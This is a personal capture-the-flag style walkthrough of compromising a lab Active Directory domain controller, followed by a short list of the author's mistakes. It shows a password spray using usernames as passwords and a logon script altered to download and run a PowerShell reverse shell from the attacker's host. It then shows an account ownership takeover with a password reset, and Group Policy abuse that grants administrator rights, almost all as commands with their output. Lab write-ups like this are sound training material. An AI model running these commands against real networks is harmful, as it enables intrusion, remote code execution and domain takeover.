
```python 
kali@kali ~> nmap -sC -sV 10.10.74.232

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 05:58 EST
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 91.67% done; ETC: 05:59 (0:00:03 remaining)
Nmap scan report for 10.10.74.232
Host is up (0.060s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-01 11:00:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-01-01T10:48:08
|_Not valid after:  2026-01-01T10:48:08
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-01-01T10:48:08
|_Not valid after:  2026-01-01T10:48:08
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-01-01T10:48:08
|_Not valid after:  2026-01-01T10:48:08
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-01-01T10:48:08
|_Not valid after:  2026-01-01T10:48:08
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-01-01T11:02:06+00:00; +1m37s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-01T11:01:26+00:00
| ssl-cert: Subject: commonName=dc.baby2.vl

```




```python
kali@kali ~> nxc smb 10.10.74.232 -u 'a' -p ''
SMB         10.10.74.232    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.232    445    DC               [+] baby2.vl\a: (Guest)
kali@kali ~> nxc smb 10.10.74.232 -u 'a' -p '' --shares
SMB         10.10.74.232    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.232    445    DC               [+] baby2.vl\a: (Guest)
SMB         10.10.74.232    445    DC               [*] Enumerated shares
SMB         10.10.74.232    445    DC               Share           Permissions     Remark
SMB         10.10.74.232    445    DC               -----           -----------     ------
SMB         10.10.74.232    445    DC               ADMIN$                          Remote Admin
SMB         10.10.74.232    445    DC               apps            READ            
SMB         10.10.74.232    445    DC               C$                              Default share
SMB         10.10.74.232    445    DC               docs                            
SMB         10.10.74.232    445    DC               homes           READ,WRITE      
SMB         10.10.74.232    445    DC               IPC$            READ            Remote IPC
SMB         10.10.74.232    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.74.232    445    DC               SYSVOL                          Logon server share 

```



```python
kali@kali ~> cat /tmp/nxc_hosted/nxc_spider_plus/10.10.74.232.json
{
    "NETLOGON": {
        "login.vbs": {
            "atime_epoch": "2023-09-02 10:55:51",
            "ctime_epoch": "2023-08-22 15:28:18",
            "mtime_epoch": "2023-09-02 10:55:51",
            "size": "992 B"
        }
    },
    "apps": {
        "dev/CHANGELOG": {
            "atime_epoch": "2023-09-07 15:16:15",
            "ctime_epoch": "2023-09-07 15:13:40",
            "mtime_epoch": "2023-09-07 15:20:13",
            "size": "108 B"
        },
        "dev/login.vbs.lnk": {
            "atime_epoch": "2023-09-07 15:13:23",
            "ctime_epoch": "2023-09-07 15:13:04",
            "mtime_epoch": "2023-09-07 15:20:13",
            "size": "1.76 KB"
        }
    },
    "homes": {}
}
kali@kali ~> 
```



```
kali@kali ~/10.10.74.232> nxc smb 10.10.74.232 -u 'users.txt' -p 'users.txt' --continue-on-success
SMB         10.10.74.232    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.232    445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Carl.Moore:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Harry.Shaw:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joan.Jennings:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joel.Hurst:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Kieran.Mitchell:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\library:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Lynda.Bailey:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Mohammed.Harris:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Nicola.Lamb:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Ryan.Jenkins:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Amelia.Griffiths:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore  <----------------------------------------------- SUCCESS
SMB         10.10.74.232    445    DC               [-] baby2.vl\Harry.Shaw:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joan.Jennings:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joel.Hurst:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Kieran.Mitchell:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\library:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Lynda.Bailey:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Mohammed.Harris:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Nicola.Lamb:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Ryan.Jenkins:Carl.Moore STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Amelia.Griffiths:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joan.Jennings:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joel.Hurst:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Kieran.Mitchell:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\library:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Lynda.Bailey:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Mohammed.Harris:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Nicola.Lamb:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Ryan.Jenkins:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Amelia.Griffiths:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Harry.Shaw:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Joel.Hurst:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Kieran.Mitchell:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\library:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Lynda.Bailey:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [-] baby2.vl\Mohammed.Harris:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.10.74.232    445    DC               [+] baby2.vl\library:library  <----------------------------------------------- SUCCESS


```



lets run bloodhound python

```python
kali@kali ~/10.10.74.232> rusthound -d baby2.vl -u 'library' -p 'library'
---------------------------------------------------
Initializing RustHound at 08:56:24 on 01/01/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-01-01T13:56:24Z INFO  rusthound] Verbosity level: Info
[2025-01-01T13:56:24Z INFO  rusthound::ldap] Connected to BABY2.VL Active Directory!
[2025-01-01T13:56:24Z INFO  rusthound::ldap] Starting data collection...
[2025-01-01T13:56:24Z INFO  rusthound::ldap] All data collected for NamingContext DC=baby2,DC=vl
[2025-01-01T13:56:24Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-01-01T13:56:24Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-01-01T13:56:25Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-01-01T13:56:25Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-01-01T13:56:25Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 16 users parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_users.json created!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 62 groups parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_groups.json created!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_computers.json created!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 3 ous parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_ous.json created!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_domains.json created!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_gpos.json created!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-01-01T13:56:25Z INFO  rusthound::json::maker] .//20250101085625_baby2-vl_containers.json created!

RustHound Enumeration Completed at 08:56:25 on 01/01/25! Happy Graphing!
```


![[notes-20250101185647748.webp]]


so now we know that we can possibly edit the logon script and this is my improvised script by chatgpt

```python
kali@kali ~/10.10.74.232> cat login.vbs
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://10.8.4.215/payload.ps1')"  <------

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"

```

the reverse shell i placed was the invoke-tcpEx shell nishang


```python
kali@kali ~/10.10.74.232> rlwrap -crA nc -lvnp 9001
listening on [any] 9001 ...

connect to [10.8.4.215] from (UNKNOWN) [10.10.74.232] 62208
Windows PowerShell running as user Amelia.Griffiths on DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                       
                                                                                                                     
PS C:\Windows\system32>
PS C:\Windows> cd ..
PS C:\> cat user.txt
VL{36a82a40b7dce3fa5b07a0cc81a45d22}

```


![[notes-20250101205628894.webp]]


lets investigate further into the permissions of legacy since office had nothing and it was empty

![[notes-20250101205745789.webp]]



changing permissions on the user GPOADM so we can control them as we please

```python
PS C:\temp> dir
PS C:\temp> iex(new-object net.webclient).downloadstring('http://10.8.4.215/PowerView.ps1')
PS C:\temp> Set-DomainObjectOwner -Identity 'GPOADM@BABY2.VL' -OwnerIdentity 'AMELIA.GRIFFITHS'
PS C:\temp> Set-DomainObjectOwner -Identity 'GPOADM' -OwnerIdentity 'AMELIA.GRIFFITHS'
PS C:\temp> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "AMELIA.GRIFFITHS"
PS C:\temp> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\temp> Set-DomainUserPassword -Identity 'GPOADM' -AccountPassword $NewPassword
PS C:\temp> 
```


checking if the process went smoothly

```python
kali@kali ~/tools> nxc smb 10.10.74.232 -u 'gpoadm' -p 'Password123!'
SMB         10.10.74.232    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.232    445    DC               [+] baby2.vl\gpoadm:Password123! 
```

using powerview to find a GPO to abuse

```python
PS C:\temp> 

DisplayName      : Default Domain Policy
DomainName       : baby2.vl
Owner            : BABY2\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9   <------------------------ this here is VERY important
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 8/22/2023 10:37:41 AM
ModificationTime : 1/1/2025 9:47:52 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 30, SysVol Version: 31
WmiFilter        : 

```


```python
kali@kali ~/pyGPOAbuse (master)> python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f
SUCCESS:root:ScheduledTask TASK_12053460 created!
[+] ScheduledTask TASK_12053460 created!
```

here we added the task and all that's left is to update the GPO

```python
PS C:\temp> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

Lets check if we can authenticate

```python
kali@kali ~> nxc smb 10.10.74.232 -u gpoadm -p Password123!
SMB         10.10.74.232    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.232    445    DC               [+] baby2.vl\gpoadm:Password123! (Pwn3d!)
```




---


## Mistakes

- Didnt do password guessing
	- even something simple like the username as the password
- Do not just trust your tooling go in and filter everything by hand sometimes see if you can write to things
	- i got skill checked here because I couldnt 
- eye issue LOL
- i guess when i see a logon script just fuck arounda nd literally try to see if u can edit it (there has to be a better way)



## extra things learnt

- shadow credentials is usually stealthier than forcing a changed password and this is what it would look like if i followed that path

### Shadow Credentials

```

```